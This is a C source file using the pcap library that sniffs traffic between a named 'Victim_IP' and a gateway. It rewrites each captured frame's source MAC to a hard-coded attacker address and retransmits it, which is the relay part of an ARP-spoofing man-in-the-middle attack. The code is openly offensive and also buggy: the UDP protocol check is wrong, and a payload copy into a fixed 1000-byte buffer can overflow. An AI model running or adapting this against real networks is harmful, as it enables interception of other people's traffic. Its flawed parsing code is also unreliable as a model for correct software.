#define _WINSOCK_DEPRECATED_NO_WARNINGS 

#include <stdio.h>
#include "pcap.h"
#include <WinSock2.h>
#pragma comment (lib,"ws2_32.lib")
#pragma comment (lib,"wpcap.lib")

#define BUF_SIZE 1000
#define IP_HEADER_JMP 14
#define TCP_HEADER_JMP 20
#define UDP_HEADER_JMP 8
#define DATA_JMP 20	
#define SNAPLEN 65536
struct mac_address
{
	unsigned char mac_add[6];
};
struct ether_header
{
	
	unsigned char des_mac[6];
	unsigned char src_mac[6];
	unsigned short eth_type;
	//14bytes
};

struct ip_header
{
	unsigned char ip_version : 4;
	unsigned char ip_header_length : 4;
	unsigned char ip_TOS;
	unsigned short ip_total_length;
	unsigned short ip_iden;
	unsigned char flag_x : 1;
	unsigned char flag_D : 1;
	unsigned char flag_M : 1;
	unsigned char offset_part_1 : 5;
	unsigned char offset_part_2;
	unsigned char TTL;
	unsigned char ip_protocol;
	unsigned short chk_sum;
	struct in_addr ip_src_add;
	struct in_addr ip_des_add;
	//20bytes
};

struct tcp_header
{
	unsigned short src_port;
	unsigned short des_port;
	unsigned long sqn_num;
	unsigned long ack_num;
	unsigned char offset : 4;
	unsigned char ns : 1;
	unsigned char reserve : 3;
	unsigned char flag_cwr : 1;
	unsigned char flag_ece : 1;
	unsigned char flag_urgent : 1;
	unsigned char flag_ack : 1;
	unsigned char flag_push : 1;
	unsigned char flag_reset : 1;
	unsigned char flag_syn : 1;
	unsigned char flag_fin : 1;
	unsigned short window;
	unsigned short chk_sum;
	unsigned short urgent_point;
	//20bytes
};
struct arp_header
{
	unsigned short hardware_type;
	unsigned short protocol_type;
	unsigned char hardware_size;
	unsigned char protocol_size;
	unsigned short opcode;
	unsigned char send_mac[6];
	unsigned char send_ip[4];
	unsigned char target_mac[6];
	unsigned char target_ip[4];
};
struct udp_header
{
	unsigned short src_port;
	unsigned short dst_port;
	unsigned short length;
	unsigned short chk_sum;
}; 
struct dns_header
{
	unsigned short iden;
	unsigned char QR : 1;
	unsigned char opcode:4;
	unsigned char AA : 1;
	unsigned char TC : 1;
	unsigned char RD : 1;
	unsigned char RA : 1;
	unsigned char Z : 1;
	unsigned char AD : 1;
	unsigned char CD : 1;
	unsigned char Rcode : 4;
	unsigned short total_quest;
	unsigned short total_anw;
	unsigned short total_autho;
	unsigned short total_addition;
};

//void eh_packet(const unsigned char *pkt_data,unsigned char packet[]);
//void ih_packet(const unsigned char *pkt_data, char packet[]);
//void th_packet(const unsigned char *pkt_data, char packet[]);
//void data_packet(const unsigned char *pkt_data, char packet[]);
int main(int argc, char **argv)
{
	pcap_if_t *alldevs = NULL;
	pcap_if_t *dev;
	pcap_t *use_dev;
	char errbuf[BUF_SIZE];
	char FILTER_RULE[BUF_SIZE] = "host 10.100.111.219 and 10.100.111.1 ";
	struct bpf_program rule_struct;
	int i, dev_num, res;
	struct pcap_pkthdr *header;
	const unsigned char *pkt_data;
	unsigned char packet[BUF_SIZE] = { 0, };
	

	//Victim_IP 설정
	if (argv[1] && argv[2])
	{
		strcpy(FILTER_RULE, "host ");
		strcat(FILTER_RULE, argv[1]); // FILTER_RULE (Victim_IP)설정
		strcat(FILTER_RULE, " and ");
		strcat(FILTER_RULE, argv[2]);
	}
	/*else
	{
		printf("Usage [Victim_IP] [Gateway_IP]\n");
		return -1;
	}*/

	if (pcap_findalldevs(&alldevs, errbuf) < 0)
	{
		printf("Device Find Error\n");
		return -1;
	}

	for (dev = alldevs, i = 0; dev != NULL; dev = dev->next)
		printf("%d번 Device : %s (%s)\n", ++i, dev->name, dev->description);

	printf("사용할 디바이스 번호 입력 : ");
	scanf("%d", &dev_num);

	for (dev = alldevs, i = 0; i < dev_num - 1; dev = dev->next, i++);

	if ((use_dev = pcap_open_live(dev->name, SNAPLEN, 1, 1000, errbuf)) == NULL)
	{
		printf("pcap_open ERROR!\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	printf("pcap_open 성공!\n");
	printf("FILTER_RULE : %s\n", FILTER_RULE);
	//////////					pcap_open_success				////////////

	if (pcap_compile(use_dev, &rule_struct, FILTER_RULE, SNAPLEN, 1) < 0)
	{
		printf("Compile Error!\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	if (pcap_setfilter(use_dev, &rule_struct) < 0)
	{
		printf("Setfilter Error!\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	pcap_freealldevs(alldevs); //캡처 네트워크를 제외한 네트워크 해제

	int pkt_length;

	while ((res = pcap_next_ex(use_dev, &header, &pkt_data)) >= 0)
	{
		if (res == 0) continue;
		
		struct ether_header *eh;
		eh = (struct ether_header *)pkt_data;
		//모든 SourceMAC -> ATTACKER MAC으로 바꾼 후 전송
		//
		eh->src_mac[0] = 0x98;
		eh->src_mac[1] = 0x83;
		eh->src_mac[2] = 0x89;
		eh->src_mac[3] = 0x2c;
		eh->src_mac[4] = 0x8e;
		eh->src_mac[5] = 0x15;
		memcpy(packet, &(*eh), sizeof(*eh));
		unsigned short ether_type = htons(eh->eth_type);
		pkt_data += IP_HEADER_JMP;
		if (ether_type == 0x0806)
		{
			struct arp_header *ah;
			ah = (struct arp_header *)pkt_data;
			memcpy(packet + IP_HEADER_JMP, &(*ah), sizeof(*ah));
		}
		else
		{
			struct ip_header *ih;
			ih = (struct ip_header *)(pkt_data);
			pkt_length = htons(ih->ip_total_length) + 14;
			memcpy(packet + IP_HEADER_JMP, &(*ih), sizeof(*ih));

			pkt_data += TCP_HEADER_JMP;
			if (ih->ip_protocol == 0x06)
			{
				struct tcp_header *th;
				th = (struct tcp_header *)(pkt_data);
				memcpy(packet + (TCP_HEADER_JMP + IP_HEADER_JMP), &(*th), sizeof(*th));
				pkt_data += DATA_JMP;
				memcpy(packet + (TCP_HEADER_JMP + IP_HEADER_JMP + DATA_JMP), pkt_data, pkt_length - 34);
			}
			else if (ih->ip_protocol == 0x17)
			{
				struct udp_header *uh;
				uh = (struct udp_header *)pkt_data;
				memcpy(packet + (TCP_HEADER_JMP + IP_HEADER_JMP), &(*uh), sizeof(*uh));
				
				pkt_data += UDP_HEADER_JMP;
				struct dns_header *dh;
				dh = (struct dns_header *)pkt_data;
				memcpy(packet + (TCP_HEADER_JMP + IP_HEADER_JMP + UDP_HEADER_JMP), &(*dh), sizeof(*dh));
			}
			
		}
		
		pcap_sendpacket(use_dev, packet, pkt_length);
		/*for (int i = 0; i <= pkt_length; i++)
		{
			printf("%02x ", packet[i]);
			if (i % 12 == 0)printf("\n");
		}
		printf("end\n");
		*/
	}

}